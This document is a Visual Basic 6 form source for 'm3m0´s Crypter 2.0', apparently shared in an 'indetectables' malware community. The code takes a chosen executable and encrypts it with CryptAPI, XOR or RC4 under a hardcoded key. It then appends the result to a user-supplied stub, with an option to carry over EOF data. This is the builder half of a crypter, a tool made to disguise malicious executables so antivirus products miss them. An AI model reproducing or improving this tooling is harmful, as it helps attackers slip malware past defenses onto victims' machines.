VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Caption         =   "m3m0´s Crypter 2.0          [m3m0_11]"
   ClientHeight    =   2175
   ClientLeft      =   60
   ClientTop       =   375
   ClientWidth     =   6690
   Icon            =   "crypter.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2175
   ScaleWidth      =   6690
   StartUpPosition =   3  'Windows Default
   Begin VB.OptionButton Option4 
      Caption         =   "RC4"
      Height          =   255
      Left            =   2520
      TabIndex        =   7
      Top             =   1200
      Width           =   1095
   End
   Begin VB.OptionButton Option3 
      Caption         =   "XOR"
      Height          =   255
      Left            =   1440
      TabIndex        =   6
      Top             =   1200
      Width           =   975
   End
   Begin VB.CommandButton Command3 
      Caption         =   "About"
      Height          =   255
      Left            =   5400
      TabIndex        =   5
      Top             =   1800
      Width           =   1095
   End
   Begin MSComDlg.CommonDialog ki 
      Left            =   360
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cm 
      Left            =   0
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cd 
      Left            =   720
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CheckBox Check1 
      Caption         =   "EOF Data"
      Height          =   255
      Left            =   5040
      TabIndex        =   4
      Top             =   1080
      Width           =   1335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Crypt"
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   1800
      Width           =   975
   End
   Begin VB.OptionButton Option1 
      Caption         =   "ClsCryptAPI"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   1200
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   6240
      TabIndex        =   1
      Top             =   120
      Width           =   255
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   6015
   End
   Begin VB.Label Label1 
      Caption         =   "Encriptacion"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   120
      TabIndex        =   8
      Top             =   840
      Width           =   1215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'|||||||||||||||||||||||||||||||||||||||||||
'Ejemplo source de crypter by m3m0_11
'Podra ser posteado en cualquier lado siempre conservando el nombre del autor
'|||||||||||||||||||||||||||||||||||||||||||

Const u = "gdsa·$&/ADSFSDHADF)P(ñp8o´&%IP)(&Ksfdahdfs$&ESDFASDHP/(GASDHGAS)%TagYEFFAHADFJDGL /asgsdfSDAa*=)jfgASDGASsjkhf/)O%$&(K~¬€¬kjdhgkghdkdg¬&%(=hadhdfga=$·&gjhsdfjsa/"
Private Sub Command1_Click()
With cm
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Elija el archivo a encryptar.."
.ShowOpen
End With
Text1.Text = cm.Filename
End Sub

Private Sub Command2_Click()
If cm.Filename = "" Then
MsgBox "Elija un archivo a encryptar!", vbInformation, "m3m0´s Crypter 2.0"
Exit Sub
End If

With cd
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Elija el Stub.."
.ShowOpen
End With
If cd.Filename = "" Then
MsgBox "Elija el Stub!", vbInformation, "m3m0´s Crypter 2.0"
Exit Sub
End If

With ki
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Elija donde guardar el archivo encryptado.."
.ShowSave
End With

If Check1.Value = 1 Then
Dim eof As String
eof = ReadEOFData(cm.Filename)
End If




Open cd.Filename For Binary As #1
Dim tub As String
tub = Space(LOF(1) - 1)
Get #1, , tub
Close #1

Open cm.Filename For Binary As #1
Dim se As String
se = Space(LOF(1) - 1)
Get #1, , se
Close #1

Dim es As String, cls As String, sz As New clsCryptAPI

If Option1.Value = True Then
cls = sz.EncryptString(se, u)
es = 1
End If

If Option3.Value = True Then
Dim v As New clsSimpleXOR
cls = v.EncryptString(se, u)
es = 2
End If

If Option4.Value = True Then
Dim c As New clsRC4
cls = c.EncryptString(se, u)
es = 3
End If



Open ki.Filename For Binary As #4
Put #4, , tub & u
Put #4, , es & u
Put #4, , cls & u
Close #4

If Check1.Value = 1 Then

Call WriteEOFData(ki.Filename, eof)

End If

MsgBox "File crypted!", vbInformation, "m3m0´s Crypter 2.0"


End Sub

Private Sub Command3_Click()
MsgBox "Simple crypter created by m3m0_11 ..::Open source edition::..  for indetectables comunity", vbInformation, "m3m0´s Crypter 2.0"

End Sub

Private Sub Form_Load()
Option1.Value = True
End Sub
